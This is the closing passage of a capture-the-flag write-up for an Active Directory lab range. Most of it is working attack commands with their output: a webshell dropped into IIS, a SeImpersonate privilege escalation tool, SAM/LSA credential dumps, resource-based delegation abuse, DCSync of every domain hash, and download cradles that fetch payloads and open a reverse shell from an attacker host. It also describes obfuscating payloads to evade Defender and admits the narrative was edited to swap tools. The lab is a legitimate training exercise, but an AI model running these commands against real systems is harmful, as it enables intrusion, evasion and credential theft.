PS C:\inetpub\wwwroot> iwr http://10.0.10.5:7777/webshell.aspx -outfile shell.aspx

PS C:\inetpub\wwwroot> dir

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         7/5/2026  10:53 AM                aspnet_client
-a----        7/12/2026  12:05 PM          29425 index.html
-a----         8/23/2026   7:00 PM           1162 shell.aspx
```

```bash
192.168.211.2 - - [24/Aug/2026 00:24:22] "GET /webshell.aspx HTTP/1.1" 200 -
192.168.211.2 - - [24/Aug/2026 00:26:11] "GET /webshell.aspx HTTP/1.1" 200 -
192.168.211.2 - - [24/Aug/2026 00:30:00] "GET /shell.aspx HTTP/1.1" 200 -
```

> Note: Real-time AV flagged the standard webshell payload during the initial drop, so we swapped it out for an obfuscated variant to bypass detection and land cleanly.

`http://10.0.20.10/shell.aspx` executes as `iis apppool\defaultapppool` — and there's the eternal gift again:

![Webshell — whoami as iis apppool\defaultapppool](/assets/images/westbridge-webshell-whoami.png)

![Webshell — whoami /priv: SeImpersonatePrivilege enabled](/assets/images/westbridge-webshell-privs.png)

### 19.4.2 CrystalPotato — SeImpersonate ➜ SYSTEM

> Truth be told, a custom Go-wrapped GodPotato paired with a bit of **lazy obfuscation** — manually stripping symbols and scrambling Nishang reverse shell variables — *did* the heavy lifting in the lab first. But when a shiny alternative dropped on Xitter right as the write-up was coming together, pragmatism took the wheel. Why document an hours-long exercise in dodging Defender signatures when you can swap it for a fresh tool that gets the exact same `NT AUTHORITY\SYSTEM` banner? Sometimes, rewriting history for the sake of a smoother walkthrough is just good editorial license.

CrystalPotato time:

```powershell
> iwr http://10.0.10.5:7777/CrystalPotato.exe -OutFile C:\Programdata\potato.exe

> C:\Programdata\potato.exe -c "net user Administrator SecretMyth123!"
```

![CrystalPotato — whoami as nt authority\system](/assets/images/westbridge-webshell-potato-whoami.png)

![CrystalPotato — Administrator password rotated](/assets/images/westbridge-webshell-potato-admin-passwd.png)

### 19.4.3 Local Admin Password Rotation ➜ winrmexec ➜ Flag06

Local admin password rotated ➜ winrmexec as `web\administrator`:

```bash
➜ evil_winrmexec \
    westbridge-research.hsm/'administrator:SecretMyth123!'@web.westbridge-research.hsm

...[snip]...

PS > whoami; hostname
web\administrator
WEB

PS > type ..\Desktop\*
Flag06[Potato_XXXXX_XXX_0wned]
```

**Flag 6 captured.**

## 19.5 LSA Secrets ➜ The Machine That Owns DC02

### 19.5.1 Dump — nxc --sam --lsa as Administrator

Administrator on research-WEB means SAM + LSA dumps:

```zsh
➜ nxc smb web.westbridge-research.hsm \
    -u 'administrator' -p 'SecretMyth123!' --local-auth --sam --lsa
SMB         10.0.20.10      445    WEB              [*] Windows 11 / Server 2025 Build 26100 x64 (name:WEB) (domain:WEB) (signing:True) (SMBv1:False)
SMB         10.0.20.10      445    WEB              [+] WEB\administrator:SecretMyth123! (Pwn3d!)
SMB         10.0.20.10      445    WEB              [*] Dumping SAM hashes
SMB         10.0.20.10      445    WEB              Administrator:500:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         10.0.20.10      445    WEB              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.20.10      445    WEB              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.0.20.10      445    WEB              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
SMB         10.0.20.10      445    WEB              [+] Added 4 SAM hashes to the database
SMB         10.0.20.10      445    WEB              [*] Dumping LSA secrets
SMB         10.0.20.10      445    WEB              WESTBRIDGE-RESEARCH.HSM/a.howard:$DCC2$10240#a.howard#06d655cd496c750af4211e7a47d3b9a2: (2026-08-23 07:33:37)
SMB         10.0.20.10      445    WEB              WESTBRIDGE-RESEARCH.HSM/r.parker:$DCC2$10240#r.parker#4cb5aa3a68992cdcae1a248aaad10cc5: (2026-08-23 18:03:04)
SMB         10.0.20.10      445    WEB              WESTBRIDGE-RESEARCH.HSM/j.bones:$DCC2$10240#j.bones#3e2edcd3b216cdd30319efa8f7dacd69: (2026-08-23 18:12:18)
SMB         10.0.20.10      445    WEB              WBRESEARCH\WEB$:aes256-cts-hmac-sha1-96:1bff63e581469282b52b61d48d0121de60831370117f5f921e6bee7d7f68d6e8
SMB         10.0.20.10      445    WEB              WBRESEARCH\WEB$:aes128-cts-hmac-sha1-96:3bd7f21178b786e452af5560b9dc76ff
SMB         10.0.20.10      445    WEB              WBRESEARCH\WEB$:des-cbc-md5:e69219f10df268b5
SMB         10.0.20.10      445    WEB              WBRESEARCH\WEB$:plain_password_hex:2a002d003b004e0025005b004f0077007a0022002b0068002e003c005d0076004e00360031003a004b004d007a0066002d003d005600430051003a00490062004e004e004b007900360063005a002f004d0040002a00610038004900590054004b00540038002400670068005300760038003100660052004e00740020006d00400031002e005100720047002600400056005f004100480027006e006a005000470045003b0026006f00330078007900440032002f005d00550020004200330055004d0063003e006d005e006f002700790066006a005b003800600036005300290031002e005a004f00670038005800
SMB         10.0.20.10      445    WEB              WBRESEARCH\WEB$:aad3b435b51404eeaad3b435b51404ee:34f86e11de7057d31e5d65754f1912ab:::
SMB         10.0.20.10      445    WEB              WBRESEARCH\a.howard:fdCgRAxJq0lY
SMB         10.0.20.10      445    WEB              dpapi_machinekey:0x2a3673b46679e2c8bcc634dcef8c8ea20d5bddfe
dpapi_userkey:0xf7280c4909aaad002ed730d56af53c8502e1fd8f
SMB         10.0.20.10      445    WEB              M$MachineBoundCertificate:76000000010000000303000003030000000000001700000064000000010000000101000001000000333b490526c7cc69e25ae497f3ed7053e13659d55bd26ecf5ba3f18b2e27954568b08bda69a03479b65a639bfa19ecea0100000000000000000000000000000001000000880200004c736149736f4173796d6d65747269634b6579426c6f624c154970f4bfc145d90a28ba76d690f84369042a068edbc75227657358b11d5b933c5b8a74819961600011a8fbd63579fce01044d28f51413776cd0720a90a922c994989eb9cd4366e51f0b96b57a4b19a6b0be7dc30610822070303eece66c6007418cc018b1d51
...[snip]...
d36be6494c1ad4e78b0c7dd70a3b581551386496b9a0d65d2e005e37cfbe677497e094092fd5b2b8121128c71f6342b065e896eb920536c7636ce19836588c5efd4d48a7de0bcd4ead332c3ad2
SMB         10.0.20.10      445    WEB              [+] Dumped 11 LSA secrets to /home/deus/.nxc/logs/lsa/WEB_10.0.20.10_2026-08-24_005124.secrets and /home/deus/.nxc/logs/lsa/WEB_10.0.20.10_2026-08-24_005124.cached
```

### 19.5.2 Read the Loot Table — Why WEB$ AES256 Matters

The headline is the **AES256 key of `WEB$`** — and per the BloodHound graph, `WEB$` holds constrained-delegation rights toward the research DC itself. That combination is [Section 19.6](#196-s4u-as-administrator-dcsync-flag07)'s whole payload: *the machine key of an account trusted to impersonate users against `DC02`*. Machine keys don't rotate out from under you here either (`ad_maximum_machine_account_password_age = 0` pattern again — this time confirmed by the LSA dump carrying both the AES key and a plaintext hex password for WEB$).

But read the rest of that loot table too, because it's a small museum:

| Loot | What it is | What it's worth |
|---|---|---|
| `$DCC2$` entries ×3 | Domain cached credentials (MS-CACHE2) for a.howard, r.parker, j.bones | Crackable offline at `-m 2100`; we didn't need them |
| **`WBRESEARCH\a.howard : fdCgRAxJq0lY`** | a.howard's **plaintext**, stored by whatever service cached it | A live identity in the research forest — its GenericWrite over `DC02$` is the designed path used in [Section 19.6](#196-s4u-as-administrator-dcsync-flag07) |
| `WEB$ plain_password_hex` | The research web server's own machine-account password, in hex | Full `WEB$` identity without Kerberos at all |

Cached domain credentials on a web server are a pattern worth internalizing: anything that ever authenticated *as a domain user* through this box left residue, and local admin turns residue into identities.

## 19.6 S4U as Administrator ➜ DCSync ➜ Flag07

> Resource-Based Constrained Delegation: The most elegant way to tell a Domain Controller, "Trust me, I'm the Web Server." Next stop, DCSync.

### 19.6.1 RBCD on DC02$ via a.howard's GenericWrite

`A.HOWARD` holds **GenericWrite over `DC02$`** — the lab's designed path into the research DC. The credential: `WBRESEARCH\a.howard : fdCgRAxJq0lY`, plaintext, leaked from [Section 19.5](#195-lsa-secrets-the-machine-that-owns-dc02)'s LSA dump (`RID 1113`). No crack.

Delegation triangle, fully assembled:
- **a.howard** — `GenericWrite` on `DC02$`'s `msDS-AllowedToActOn-Behalf-Other-Identity`
- **WEB$** — AES256 key from [Section 19.5](#195-lsa-secrets-the-machine-that-owns-dc02); principal we authenticate as (no password)
- **DC02$** — `cifs` target we want as Administrator

One bloodyAD call writes the ACE. Same primitive as the FILES hop earlier, one forest over:

```bash
➜ getTGT.py westbridge-research.hsm/a.howard:'fdCgRAxJq0lY' \
    -dc-ip 10.0.20.5
```

```bash
➜ bloodyAD \
    --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
    -u 'a.howard' \
    -k ccache=./a.howard.ccache \
    add rbcd 'DC02$' 'WEB$'

[!] No security descriptor has been returned, a new one will be created
[+] WEB$ can now impersonate users on DC02$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+ccache://westbridge-research.hsm\a.howard:.%2Fa.howard.ccache@dc02.westbridge-research.hsm/?serverip=10.0.20.5&dc=10.0.20.5' 'HOST/DC02$@westbridge-research.hsm' 'Administrator@westbridge-research.hsm'
```

*One ACE written, full domain compromise — WEB$ can now S4U2Proxy any user into DC02$.*

### 19.6.2 S4U as Administrator — cifs/DC02

```bash
➜ getST.py \
    'westbridge-research.hsm/WEB$' \
    -aesKey 1bff63e581469282b52b61d48d0121de60831370117f5f921e6bee7d7f68d6e8 \
    -spn 'cifs/dc02.westbridge-research.hsm' \
    -dc-ip 10.0.20.5 \
    -impersonate Administrator

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM.ccache
```

### 19.6.3 DCSync — krbtgt + every key (secretsdump)

```bash
➜ env KRB5CCNAME=Administrator@cifs_dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM.ccache \
secretsdump.py dc02.westbridge-research.hsm -k -no-pass -dc-ip 10.0.20.5 -just-dc

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:401138f45c010097b6a7b25eae9a6446:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cd83c3f7dfadf278326d4f6a51f9144e:::
westbridge-research.hsm\r.parker:1106:aad3b435b51404eeaad3b435b51404ee:5e8e795caadfb55300f69a63a01b4214:::
westbridge-research.hsm\m.carter:1107:aad3b435b51404eeaad3b435b51404ee:a6373921791f5e1c1647734b09be1dd3:::
westbridge-research.hsm\t.walker:1108:aad3b435b51404eeaad3b435b51404ee:1171f498bf19b2dee833a2f958718989:::
westbridge-research.hsm\j.bones:1110:aad3b435b51404eeaad3b435b51404ee:c409deabbc872162494f8ba329f3eb30:::
westbridge-research.hsm\a.howard:1113:aad3b435b51404eeaad3b435b51404ee:615e8c800974e895f53ca1d162f0d80b:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:8eb294cfd081a7fb157593931763c938:::
WEB$:1101:aad3b435b51404eeaad3b435b51404ee:34f86e11de7057d31e5d65754f1912ab:::
WESTBRIDGE$:1104:aad3b435b51404eeaad3b435b51404ee:1ac6d24fc53b7f3434fa73a7413a86cc:::
[*] Kerberos keys grabbed
Administrator:0x14:cde2c6838fd233f5fd6fedf004715841a4331ca41ec41f81287118fe8971a2a9
Administrator:0x13:f36a3c577fdb8e724228b71e63c8c446
Administrator:aes256-cts-hmac-sha1-96:06a405bc0b070a460a77081b4a6ff16e8c1c79492d9fd2cab079cb5dab322f36
Administrator:aes128-cts-hmac-sha1-96:51f94c1e6560a9401d58dfed1a59b063
Administrator:0x17:401138f45c010097b6a7b25eae9a6446
krbtgt:aes256-cts-hmac-sha1-96:cc9da2a4fbea735e4da2c0042b9cfec9a41b9ae80934f300638cd631d06174f3
krbtgt:aes128-cts-hmac-sha1-96:72c632894b4b1d5d21a9b9c2bfcf1034
krbtgt:0x17:cd83c3f7dfadf278326d4f6a51f9144e
westbridge-research.hsm\r.parker:0x14:e36ccc39830af38335566404e158b1830aca76b2edb6c243e5466141df807afd
westbridge-research.hsm\r.parker:0x13:44b75307da9e395da064ae648d9dc4d0
westbridge-research.hsm\r.parker:aes256-cts-hmac-sha1-96:276f9152344f30c1f3096d2a4eb6feaec46cff500223acd47dc6bc8280e7ef41
westbridge-research.hsm\r.parker:aes128-cts-hmac-sha1-96:877d77d4e3d4102b715ee12982478b4d
westbridge-research.hsm\r.parker:0x17:5e8e795caadfb55300f69a63a01b4214
westbridge-research.hsm\m.carter:0x14:d75b0b94359ecac6e4c9e9e885ced36a9855a343517f6bf25eec15bc79c30360
westbridge-research.hsm\m.carter:0x13:4fc9d7c97d45282b31e45a1119bc2437
westbridge-research.hsm\m.carter:aes256-cts-hmac-sha1-96:110a039b4eb5b899eb7efe8189892cc0bf0138dd8002390e67f6bb60826c4570
westbridge-research.hsm\m.carter:aes128-cts-hmac-sha1-96:5f34ad51edb22745b58758cbc05bb342
westbridge-research.hsm\m.carter:0x17:a6373921791f5e1c1647734b09be1dd3
westbridge-research.hsm\t.walker:0x14:b729bb75ff3055e2ac6600925b1bac2d9a3d9b5b57922b9d8c4a9f2e0faad649
westbridge-research.hsm\t.walker:0x13:3934fe69fe3a3a61cac5155364a69f35
westbridge-research.hsm\t.walker:aes256-cts-hmac-sha1-96:e17a896cf2936ece0c73381b4ceac46f81509c215a13e2f66ac1cb41d88df8c7
westbridge-research.hsm\t.walker:aes128-cts-hmac-sha1-96:dfded4c6e91cf8b5821459c14e63c6ba
westbridge-research.hsm\t.walker:0x17:1171f498bf19b2dee833a2f958718989
westbridge-research.hsm\j.bones:0x14:3d228d4cbe3f0b677f929d83ddc28e22f927119d957bd644c87531bb60de4473
westbridge-research.hsm\j.bones:0x13:098db7ba8014b7342331b07fa671d143
westbridge-research.hsm\j.bones:aes256-cts-hmac-sha1-96:6aa7a734cae0f87adf7afd5571d768727eb6b0063a56fe2de7fa12a7cb8bc698
westbridge-research.hsm\j.bones:aes128-cts-hmac-sha1-96:c7fd731645157784d130c9ff7ac82b06
westbridge-research.hsm\j.bones:0x17:c409deabbc872162494f8ba329f3eb30
westbridge-research.hsm\a.howard:0x14:764449547a61182d9bb2362cce515ea6a1090f358dd735361995c264617e5ed7
westbridge-research.hsm\a.howard:0x13:34439e411237802f776460060f4baebe
westbridge-research.hsm\a.howard:aes256-cts-hmac-sha1-96:cf53b16cca1364d36ae3830db39b29b3bb4ce46ba8fadcd51bd7b56026389de2
westbridge-research.hsm\a.howard:aes128-cts-hmac-sha1-96:7c83baf862cfe5a135808cef1db9b35f
westbridge-research.hsm\a.howard:0x17:615e8c800974e895f53ca1d162f0d80b
DC02$:aes256-cts-hmac-sha1-96:b8be9ec1a90a3233c0c8cd7cefddd3cfe5d16b92477b6f189aabe3da2c6cc4da
DC02$:aes128-cts-hmac-sha1-96:97486d01d3b74cd944a4dfb26b4e3e99
DC02$:0x17:8eb294cfd081a7fb157593931763c938
WEB$:0x14:15f36bcfc12fbb9a700eb6a5331bf9980d049a76d61d95ff5b044202327dcde5
WEB$:0x13:9d0a62c059d74b223257a1685c27b0d7
WEB$:aes256-cts-hmac-sha1-96:1bff63e581469282b52b61d48d0121de60831370117f5f921e6bee7d7f68d6e8
WEB$:aes128-cts-hmac-sha1-96:3bd7f21178b786e452af5560b9dc76ff
WEB$:0x17:34f86e11de7057d31e5d65754f1912ab
WESTBRIDGE$:aes256-cts-hmac-sha1-96:99fedcc14ac17e41ce7d2d0efc51b8ff04060ef0daf82328aa0559b61f81333c
WESTBRIDGE$:aes128-cts-hmac-sha1-96:716c2bfa0eb7d67fb39f8f2fbec78402
[*] Cleaning up...
```

**Full DCSync of WESTBRIDGE-RESEARCH.HSM** — every NT hash and Kerberos key, krbtgt included. Golden tickets for the research forest are now mintable at will.

### 19.6.4 WinRM on DC02 — getTGT.py + winrmexec ➜ Flag07

Final approach with the Administrator AES key:

```bash
➜ getTGT.py westbridge-research.hsm/administrator \
    -aesKey 06a405bc0b070a460a77081b4a6ff16e8c1c79492d9fd2cab079cb5dab322f36 \
    -dc-ip 10.0.20.5
```

```zsh
➜ env KRB5CCNAME=administrator.ccache \
evil_winrmexec -k dc02.westbridge-research.hsm -dc-ip 10.0.20.5

...[snip]...

PS C:\Users\Administrator\Documents> whoami; hostname
wbresearch\administrator
DC02

PS > type ..\Desktop\root.txt
Flag07[DC_XXXXX_XXXXXXX_C0mplete]
```

**Flag 7 captured. Range complete — both forests, every host, every flag.**

### 19.7 Flags Captured

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Admin | Flag02 |
| WEB 10.0.10.10 | root | Flag03 |
| HELPDESK-WS 10.0.10.25 | local admin | Flag04 |
| DC 10.0.10.5 | Domain Admin (ESC4) | Flag05 |
| WEB 10.0.20.10 | SYSTEM ➜ local Admin | Flag06 |
| **DC02 10.0.20.5** | **DA + full DCSync** | **Flag07** |

---

# Appendix A: The SeImpersonate Potato — CrystalPotato

Both of Westbridge's Windows `SYSTEM` hops — SQL ([Section 9.6](#96-system-on-sql)) and the research web server ([Section 19.4](#194-webshell-crystalpotato-system)) — ran the same binary: **CrystalPotato**, a Rust port of [GodPotato](https://github.com/BeichenDream/GodPotato) (the `C#` original). The binary is a single EXE with no dependencies, and the lab used it twice with two different threat models — once where AV was off, once where Defender was on. This appendix unpacks the primitive, the tool, and both runs.

## A.1 The primitive — `SeImpersonatePrivilege`

Windows grants every service-style account a small set of privileges by default. The one that matters here is `SeImpersonatePrivilege` — per [MS docs on the privilege constant](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants), it lets a process "impersonate a client after authentication." That sounds narrow, but combined with the fact that **the SYSTEM security context authenticates to many local services** (DCOM, RPC, named pipes, the Print Spooler, the Task Scheduler, etc.), it becomes a one-shot path to a SYSTEM token: you make the service talk to *you*, SYSTEM connects back as the client, your token's privilege lets you `OpenProcessToken` + `DuplicateTokenEx` it, and the resulting primary token is yours to spawn a child process under.

This is the entire **"Potato" family** — `RottenPotato` (2016), `JuicyPotato` (2018), `SweetPotato` (2020), `GodPotato` (2022), `CrystalPotato` (2026+). All of them are the same primitive with different coercion paths and different evasion postures. The technique works on every modern Windows version by default; what changes between Potatoes is which DCOM/RPC interface they abuse to trigger the SYSTEM callback, and how loudly the binary advertises itself to AV.

## A.2 The tool — CrystalPotato specifically

Two references, both verified at the time of writing:

* Author's project page: <https://ricardojoserf.github.io/crystalpotato/>
* Source / build instructions: <https://github.com/ricardojoserf/CrystalPotato>

What the binary actually does (per the [README](https://github.com/ricardojoserf/CrystalPotato)):

* **Escalation path:** abuse the **DCOM OXID Resolver** to make the local SYSTEM connect to a named pipe the attacker controls, then `ImpersonateNamedPipeClient` + `DuplicateTokenEx` to materialise a primary token and `CreateProcessAsUser` to launch a child under SYSTEM. The classic "coerce SYSTEM to talk to your pipe" pattern.
* **Evasion posture:** Windows APIs are resolved dynamically at runtime, called through indirect syscall stubs (so the binary's import table is empty), and all strings are XOR-obfuscated at compile time. The README's own description leads with "Crystal port of GodPotato, a local privilege escalation from accounts with `SeImpersonatePrivilege` to SYSTEM. It works by abusing the DCOM OXID Resolver and named pipe impersonation."
* **Tested platforms (per README):** Windows 10, 11, Server 2025. Single static EXE, no DLL deps. Builds with `crystal build CrystalPotato.cr -o CrystalPotato.exe --release --static`.

What it is *not*: it is **not** a memory-corruption exploit. There is no CVE, no overflow, no kernel bug. The whole family abuses a Windows privilege working exactly as documented. Pointed at itself.

## A.3 Run 1 — SQL (`10.0.10.20`), no AV

This is the [Section 9.6](#96-system-on-sql) hop in full. `xp_cmdshell` gave us a `westbridge\svc_mssql` shell; `whoami /priv` showed `SeImpersonatePrivilege: Enabled`. CrystalPotato was a clean, no-friction drop — the box had no Defender or third-party AV running, so the obfuscation layer was a nice-to-have, not a requirement.

**Drop the binary** over the existing `svc_mssql` shell:

```bash
PS > certutil -urlcache -f -split http://192.168.211.2/CrystalPotato.exe potato.exe
```

`certutil -urlcache` is the standard download-cradle here — same pattern as the `powershell` one-liner used elsewhere in the post. The `-f` (force overwrite) and `-split` (split on `;` boundaries in case the URL contains them) are defaults from the lab's `certutil` notes.

**Test it first** with a single non-side-effecting command — `-c whoami` runs `whoami` under the impersonated SYSTEM token and exits. Cheap proof the coercion lands before betting the shell on it:

```bash
PS > .\potato.exe -c whoami
nt authority\system
```

The output `nt authority\system` is the *only* line — CrystalPotato's "only the command output is printed by default" behaviour (from the README) means you get the `whoami` stdout and nothing else. Confirms the SeImpersonate coercion landed; the binary is functional.

**Pull the SYSTEM shell** by running the same PowerShell download-cradle as the previous hop, but inside the impersonated token. The base64 decodes to a `Net.WebClient.DownloadString` against the attacker's `shell.ps1`. The reverse shell callback lands on a *second* listener (`9295`), distinct from the `9294` shell that was the `svc_mssql` user-context one:

```bash
PS > .\potato.exe -c 'powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADEAMQAuADIALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA'
```

No output in the foreground — the binary execs and the child shell process is what connects back. A new `ncat` window on `9295` would show the SYSTEM prompt.

## A.4 Run 2 — research web (`10.0.20.10`), Defender enabled

This is the [Section 19.4](#194-webshell-crystalpotato-system) hop. ASPX webshell dropped into `C:\inetpub\wwwroot` ran as `iis apppool\defaultapppool`; `whoami /priv` again showed `SeImpersonatePrivilege: Enabled`. **But** Defender was live on this box and had already flagged the first plain webshell upload — the post's lab note is explicit: "Defender on this box flagged the first plain webshell — the working copy was a lightly obfuscated variant." So the threat model here is *not* the same as SQL: the binary's evasion layer is the reason CrystalPotato was picked over the louder GodPotato original.

**Fetch over the ligolo tunnel** — the listener forwards port `7777` *on the DC agent* to the attacker's HTTP server, so the URL is the DC's `10.0.10.5:7777`, reachable from the research web box over the trust's routing:

```powershell
> iwr http://10.0.10.5:7777/CrystalPotato.exe -OutFile C:\Programdata\potato.exe
```

`ProgramData` is the conventional writeable-from-IIS directory for staging post-exploit tooling (hidden-ish by ACL, not user-owned, common in real engagements). Same egress as the webshell — Defender would already have seen the webshell upload, so we're not stealthy at the *fetch* level, only at the *binary* level.

**Run the escalation.**

```powershell
> C:\Programdata\potato.exe -c "net user Administrator SecretMyth123!"
The command completed successfully.
```

`The command completed successfully.` is the stdout of the `net user ...` command, run inside the SYSTEM token. Administrator's password is now rotated.

## A.5 Why one binary, two threat models

The two runs share the binary, the primitive, and the post-condition (local SYSTEM), but the *reason* for picking CrystalPotato is different on each box:

* **SQL — no AV.** The tool picked was the one that would *land clean and work first try* on Windows Server 2025. CrystalPotato fits because it is actively maintained, builds and runs on Server 2025 (per its README), and ships as a single static EXE — no DLL deps, no runtime install, drop and run. The obfuscation layer is incidental; the binary would have worked without it.
* **Research web — Defender on.** The first webshell was already flagged. The same defence that caught the webshell would catch a C# binary like the original GodPotato, whose strings and import patterns are well-known to AMSI/Defender. CrystalPotato's empty import table, indirect syscalls, and XOR-obfuscated strings are exactly the posture needed to land a tool on a Defender-watched IIS box without a custom packer. Picking it here wasn't aesthetic — the obfuscation was the reason the binary ran at all.

One binary covers both. The other Potatoes in the family (`SweetPotato`, `PrintSpoofer`, `GodPotato` itself) would have worked on SQL. On the research web box, they would have been caught at upload or at exec by AMSI/Defender signatures.

## A.6 What this appendix is *not*

CrystalPotato was the *last meter*, never the door. Both runs above happened **after** the box was already ours by a different route — the silver ticket landed `xp_cmdshell` on SQL, the IIS-as-apppool webshell landed code execution on the research web. CrystalPotato's job in each case was the local privesc from a service account to SYSTEM, not the initial access. Every hop that actually moved the lab's chain forward — the trusted header bypass, the LDAP injection, the silver ticket, the OU relocations, the shadow credential, the ESC4 — was abused mechanism, not exploit. The Potato is the technique that lets a *service* account on a host you already own turn into a SYSTEM shell; the rest of the lab is the technique that lets you reach that service account in the first place. That distinction is why this lab reads as a clean AD chain, not a CVE-of-the-month.

---

## Closing Thoughts

This range is a masterclass in making a directory confess. The Flask bypass is a fun party trick, but the real lesson spans from [Section 6](#6-the-payoff--no-preauth-cross-principal-tgs-abuse) to [Section 19](#19-the-research-forest-falls): **a failed crack isn't a dead end — it's an attribute.** `svc_legacy`'s password surviving `rockyou` looked like a wall until you noticed what `UF_DONT_REQUIRE_PREAUTH` really buys: the KDC will impersonate that account on request, *for anyone*. One misconfigured flag became four TGS hashes — including `krbtgt`'s — and every stage after it ran the same play: find where a permission outlived its purpose (a deprecated vhost, a never-rotated keytab, a tombstoned Tier-3 admin, a writable certificate template, a group stuck mid-scope-conversion) and use it precisely.

Two techniques earn headline status on their own. The **silver ticket** ([Section 9](#9-pivot--the-hidden-sql-host)) turned "we can authenticate as `svc_mssql`" into "we are sysadmin" by writing a group RID into a PAC sealed with a key the domain had already handed us — no KDC contact, no IMPERSONATE grant, no humans involved until their own backup database surrendered one anyway. And **ESC4** ([Section 17](#17-privesc-dc01--esc4-on-the-ca)) proved AD CS is just a domain controller wearing a different hat: flip one bitmask bit on a writable template, enroll as Administrator via SAN, PKINIT for the real NT hash. The CA never malfunctioned; it issued exactly what the rewritten template told it to.

### The Anatomy of Muscle Memory

The honest truth about why this chain fell apart so cleanly comes down to pattern recognition. Much of Westbridge wasn't solved by fresh deduction; it was solved by **reps**.

* **The 21-byte `logonHours` clear** ([Section 15.4](#154-clearing-the-hours)) — overwriting the bitmap with `0xFF` to wake up a blocked account — was a direct reflex pulled straight from *Mirage* (HTB), where raw LDAP modification choked on WILL_NOT_PERFORM until you mirrored a clean baseline via PowerShell's `Set-ADUser`
* **The scope ladder** ([Section 18.5](#185-group-type-abuse--ownership-is-not-permission)) — climbing Global ➜ Universal ➜ Domain Local because direct jumps fail — is a dance learned on *PingPong* (HTB), where cross-domain group management required the exact same sequence.
* **The `ksu` + keytab trick** ([Section 14.5](#145-kerberos-as-the-privilege-escalation)) — minting an `root` principal, handing the ccache to setuid `ksu.mit`, and mapping it to local root — was carried over from GOAD variations like [*Dracarys*](https://secretmyth.blog/goad/goad-dracarys/#5-looting-syrax--own-the-machine-hit-a-wall), echoing the mechanics explored in my [*Cerberus in a File*](/kerberos/cerberus-in-a-file/) breakdown.

That is the anomaly my blogs keep circling back to. Primitives are public, but the reflex isn't transferable in a dry documentation manual—only in reps. The scope ladder on `Research Web Operations` took seconds instead of minutes because *PingPong*'s `gMSA Managers` climb was recent enough muscle memory.

### Why Westbridge is the Ultimate OSCP Masterclass

From m.thompson's OU move onward, nothing was *exploited* in the CVE sense — no initial-access exploit, no memory corruption, no public 1-day. The only thing resembling a named exploit, CrystalPotato, ran *after* we already owned the box as a post-compromise `SeImpersonate` primitive; it was the final meter, never the door. Everything before that was abused-mechanism chaining: passwords relocated by ACL inheritance, logon hours cleared with one attribute write, a workstation opened because a group said so.

Even the "hardened" research forest (NTLM disabled, Kerberos-only) fell through its own trust architecture, its own group scopes, and its own delegation settings. That makes Westbridge a near-perfect blueprint for what modern Offensive Security exams reward: finding where a permission outlived its purpose and driving it precisely. Two forests, seven hosts, seven flags — and no zero-days. There didn't need to be.

**Mission complete: 7 flags · 2 forests · 7 hosts · full DCSync of both domains.**

Thanks to [Tyler Ramsbey](https://www.linkedin.com/in/tylerramsbey), founder of HackSmarter, for the platform, and to my teammate [2ubZ3r0](https://2ubz3r0.com/) for the Westbridge range design. 🔥
